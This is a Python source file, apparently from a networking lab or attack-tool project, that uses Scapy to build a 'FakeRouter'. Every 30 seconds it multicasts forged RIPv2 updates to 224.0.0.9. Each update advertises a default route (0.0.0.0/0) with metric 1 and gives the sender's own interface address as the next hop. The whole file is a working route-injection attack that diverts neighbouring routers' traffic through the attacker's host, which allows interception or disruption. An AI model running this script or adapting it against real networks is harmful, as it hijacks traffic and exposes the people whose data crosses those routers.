from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.rip import RIP, RIPEntry
from threading import Thread
from utils.utils import create_logger
import time

class FakeRouter:
    def __init__(self):
        super().__init__()
        self.logger = create_logger(self.__class__.__name__)

    def start(self):
        self.logger.info("Starting fake router...")
        thread = Thread(target=self.send_periodic_updates)
        thread.start()
        thread.join()

    def send_fake_rip_update(self):
        """
        This method constructs and broadcasts a fake RIP update packets to neighboring routers. The RIP update will
        contain a route to this fake router.

        :param self: Description
        """
        self.logger.info("Sending fake RIP update...")

        addr = "0.0.0.0"
        mask = "0.0.0.0"
        iface_ip = get_if_addr(conf.iface)

        rip = RIP(cmd=2, version=2) / RIPEntry(
            addr=addr,
            mask=mask,
            nextHop=iface_ip,
            metric=1,
        )
        rip_packet = IP(dst="224.0.0.9") / UDP(sport=520, dport=520) / rip
        send(rip_packet)

    def send_periodic_updates(self):
        """
        This method will be called when the thread starts. It will continuously send fake RIP updates every 30 seconds.
        """
        while True:
            self.send_fake_rip_update()
            time.sleep(30)

if __name__ == "__main__":
    fake_router = FakeRouter()
    fake_router.start()
